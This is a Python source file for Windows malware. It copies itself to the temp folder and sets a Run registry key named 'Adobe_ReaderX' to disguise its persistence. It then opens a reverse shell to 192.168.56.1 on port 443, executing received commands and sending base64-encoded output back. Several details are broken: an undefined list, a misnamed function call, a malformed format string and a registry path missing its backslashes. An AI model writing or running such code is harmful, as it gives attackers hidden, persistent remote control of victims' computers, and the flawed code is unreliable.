import sys
import base64
import os
import socket
import subprocess
from _winreg import *


# copy the program to the %TEMP% directory and then make a registry
# modification so this code will execute when a user logs into the computer:

def auto_run(temp_dir, file_name, run):
    # Copy exectuable to %TEMP%
    os.system('copy %s %s'(file_name, temp_dir))
    # Queries Windows registry for key values
    # Appends autorun key to runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    try:
        i = 0
        subkey = EnumValue(key, i)
        runkey.append(subkey[0])

    except WindowsError:
        pass

    if 'Adobe ReaderX' not in runkey:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'Adobe_ReaderX', 0, REG_SZ, r"%TEMP%mw.exe")
            key.close()
        except WindowsError:
            pass


def shell():
    # Base64 encoded reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.1', int(443)))
    s.send('[*] Connection Established!')
    while 1:
        data = s.recv(1024)
        if data == "quit":
            break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        encoded = base64.b64encode(stdout_value)
        s.send(encoded)
    s.close()

def main():
	tempdir = '%TEMP%'
	fileName = sys.argv[0]
	run = "SoftwareMicrosoftWindowsCurrentVersionRun"
	autorun(tempdir, fileName, run)
	shell()

if __name__ == '__main__':
	main()